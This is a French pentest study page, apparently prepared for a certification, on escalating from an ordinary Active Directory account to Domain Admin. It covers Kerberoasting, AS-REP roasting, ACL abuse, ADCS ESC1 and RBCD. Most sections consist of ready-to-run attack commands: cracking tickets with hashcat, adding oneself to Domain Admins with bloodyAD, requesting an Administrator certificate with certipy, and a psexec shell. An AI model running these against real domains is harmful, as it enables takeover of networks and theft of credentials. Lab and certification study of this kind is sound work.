# Phase 4 : Escalade de Privilèges

Tu as un compte lambda. Tu veux devenir **Domain Admin**. Voici les techniques principales.

!!! tip "Règle d'or"
    **Lire le graphe BloodHound avant de choisir la technique.** Ne pas lancer en aveugle.

---

## Arbre de décision

```
BloodHound → "Find Shortest Paths to Domain Admins" → quel est le chemin ?
    │
    ├── ACL directe (GenericAll / WriteDACL / ForceChangePassword)
    │       → 4.1 ACL Abuse
    │
    ├── Compte Kerberoastable sur le chemin
    │       → 4.2 Kerberoasting
    │
    ├── Compte AS-REP Roastable
    │       → 4.3 AS-REP Roasting
    │
    ├── Template ADCS vulnérable (ESC1/ESC8)
    │       → 4.4 ADCS
    │
    └── Machine avec délégation Kerberos
            → Voir [Kerberos](../fondamentaux/kerberos.md)
```

---

## 4.1 : Kerberoasting

### Le concept

N'importe quel utilisateur du domaine peut demander un **ticket Kerberos** pour n'importe quel compte de service. Ce ticket est **chiffré avec le hash du compte de service**. On peut le cracker offline.

```
1. On liste les comptes avec un SPN (Service Principal Name)
2. On demande leur ticket TGS
3. On extrait le hash du ticket
4. On crack offline avec hashcat
```

```bash
# Lister les SPNs et récupérer les hashes TGS
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD \
    -dc-ip $DC_IP \
    -request \
    -outputfile ~/certif/hashes/kerberoast.hash

# Via nxc
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --kerberoasting ~/certif/hashes/kerberoast.hash

# Cibler un compte précis
GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD \
    -request-user svc_sql -dc-ip $DC_IP
```

```bash
# Crack avec Hashcat (RC4 = mode 13100)
hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt

# Avec règles (recommandé : les mots de passe service sont souvent complexes)
hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    ~/certif/hashes/kerberoast.hash
```

!!! note "Condition"
    Ça marche uniquement si le compte de service a un **mot de passe faible**. Les comptes gérés automatiquement (**gMSA**) sont immunisés.

---

## 4.2 : AS-REP Roasting

### Le concept

Normalement, Kerberos exige une **pré-authentification** : le client prouve qu'il connaît son mot de passe avant de recevoir un ticket. Mais si cette option est désactivée sur un compte, n'importe qui peut demander un ticket AS-REP pour ce compte, **sans mot de passe**.

```bash
# Trouver les comptes vulnérables et récupérer les hashes
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --asreproast ~/certif/hashes/asrep.hash

# Sans compte valide (si on a une liste d'users)
GetNPUsers.py $DOMAIN_FQDN/ -usersfile users.txt -no-pass -dc-ip $DC_IP

# Crack (mode 18200)
hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
john --format=krb5asrep \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    ~/certif/hashes/asrep.hash
```

---

## 4.3 : Abus des ACL (Access Control Lists)

Les mauvaises configurations d'ACL créent des chemins d'escalade.
**BloodHound** détecte ces chemins automatiquement dans l'onglet "Outbound Object Control".

### Droits dangereux

| Droit | Ce que ça permet |
|-------|-----------------|
| **GenericAll** | Contrôle total sur l'objet |
| **GenericWrite** | Modifier les attributs (SPN, KeyCredential...) |
| **WriteOwner** | Devenir propriétaire |
| **WriteDACL** | Modifier les ACL → se donner GenericAll |
| **DCSync** | Répliquer les hashes du DC |
| **ForceChangePassword** | Changer le mot de passe sans connaître l'actuel |
| **AddMember** | Ajouter des membres dans un groupe |

### Exemple concret de chaîne ACL

```
Alice a GenericWrite sur le compte ServiceSQL
→ On modifie le SPN de ServiceSQL
→ On fait du Kerberoasting sur ServiceSQL
→ On crack son mot de passe
→ ServiceSQL est membre de Domain Admins
→ Game over
```

### ForceChangePassword

```bash
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    set password $TARGET_USER 'NewPass123!'
```

### GenericAll / GenericWrite → Reset mot de passe

```bash
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    set password $TARGET_USER 'Pwn3d2024!'
```

### WriteDACL → Se donner GenericAll

```bash
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    add genericAll "DC=$DOMAIN,DC=local" $USER
```

### AddMember → S'ajouter à un groupe

```bash
bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP \
    add groupMember 'Domain Admins' $USER

# Vérifier
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN
```

### GenericWrite → Shadow Credentials (sans reset visible)

```bash
certipy shadow auto \
    -u "$USER@$DOMAIN_FQDN" -p $PWD \
    -account $TARGET_USER -dc-ip $DC_IP
```

### GenericWrite → Targeted Kerberoasting (ajouter un SPN)

```bash
targetedKerberoast.py -d $DOMAIN_FQDN -u $USER -p $PWD --dc-ip $DC_IP
```

---

## 4.4 : ADCS : Abus de templates vulnérables

```bash
# Énumérer les templates vulnérables
certipy find -u $USER@$DOMAIN_FQDN -p $PWD \
    -dc-ip $DC_IP -vulnerable -stdout

# ESC1 : Demander un certificat pour Administrator
certipy req \
    -u $USER@$DOMAIN_FQDN -p $PWD \
    -target $CA_SERVER \
    -template $VULN_TEMPLATE \
    -ca $CA_NAME \
    -upn Administrator@$DOMAIN_FQDN

# S'authentifier avec le certificat → obtenir le NT hash d'Administrator
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

## 4.5 : RBCD (Resource-Based Constrained Delegation)

```bash
# Prérequis : avoir GenericWrite sur une machine cible

# 1. Créer un compte machine
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123!' \
               -dc-ip $DC_IP $DOMAIN_FQDN/$USER:$PWD

# 2. Configurer RBCD
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
        -dc-ip $DC_IP -action write $DOMAIN_FQDN/$USER:$PWD

# 3. S4U → obtenir un ticket Administrator
getST.py -spn 'cifs/target.entreprise.local' \
         -impersonate Administrator \
         $DOMAIN/EVIL\$:'EvilPass123!'

export KRB5CCNAME=$PWD/Administrator.ccache
psexec.py -k -no-pass target.entreprise.local
```

---

## 4.6 : Après le crack : tester et continuer

```bash
# Tester les nouveaux credentials
nxc smb $RANGE -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN --continue-on-success
nxc smb $DC_IP -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN
# Si (Pwn3d!) sur le DC → Domain Admin !

# Vérifier dans BloodHound si le nouveau compte mène vers DA
# (marquer le compte comme "Owned" dans BloodHound)
```

---

## Checklist Phase 4

- [ ] BloodHound lu → technique d'escalade choisie
- [ ] ACL abuse effectué si chemin ACL identifié
- [ ] Kerberoasting lancé + crack hashcat `-m 13100`
- [ ] AS-REP Roasting lancé + crack hashcat `-m 18200`
- [ ] ADCS scanné pour templates vulnérables
- [ ] Nouveau compte testé avec `nxc smb $RANGE`
- [ ] `(Pwn3d!)` sur le DC → [Phase 6 Compromission](06-compromission.md) directement
- [ ] Sinon → [Phase 5 Mouvement Latéral](05-mouvement-lateral.md)
